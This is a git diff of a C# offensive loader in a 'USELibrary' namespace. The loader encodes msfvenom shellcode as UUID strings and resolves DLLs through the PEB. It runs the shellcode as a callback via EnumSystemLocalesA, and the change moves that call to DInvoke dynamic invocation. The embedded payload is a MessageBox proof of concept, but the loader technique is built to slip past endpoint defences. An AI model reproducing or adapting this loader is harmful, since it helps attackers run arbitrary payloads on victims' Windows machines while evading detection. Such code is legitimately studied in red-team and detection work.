@@ -61,6 +61,7 @@ namespace USELibrary
             };
             */
 
+            
             // MessageBox PoC - msfvenom -a x64 --platform windows -p windows/x64/messagebox TEXT="hello world" -f csharp 
             string[] uuids =
             {
@@ -84,6 +85,7 @@ namespace USELibrary
                 "726f7720-646c-4d00-6573-73616765426f",
                 "00000078-0000-0000-0000-000000000000"
             };
+            
 
 
             // Get pointer to DLLs from PEB 
@@ -114,14 +116,13 @@ namespace USELibrary
 
             }
 
-            // This keeps gives me accessviolation error :( 
-            //object[] enumSystemLocalesAParam = { heapAddr, 0 };
-            //var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);
-
             // 3. Executing shellcode as a callback function 
-            // Using Marshal GetDelegateForFunctionPointer for now, since DynamicFunctionInvoke keep gives me access violation error.
-            var enumSystemLocalesA = Marshal.GetDelegateForFunctionPointer(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA)) as DELEGATE.EnumSystemLocalesA;
-            enumSystemLocalesA(heapAddr, 0);
+            object[] enumSystemLocalesAParam = { heapAddr, 0 };
+            var result = DInvoke.DynamicInvoke.Generic.DynamicFunctionInvoke(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA), ref enumSystemLocalesAParam);
+
+            // Use this if #3 gies access violation error 
+            //var enumSystemLocalesA = Marshal.GetDelegateForFunctionPointer(pEnumSystemLocalesA, typeof(DELEGATE.EnumSystemLocalesA)) as DELEGATE.EnumSystemLocalesA;
+            //enumSystemLocalesA(heapAddr, 0);
         }
     }
 
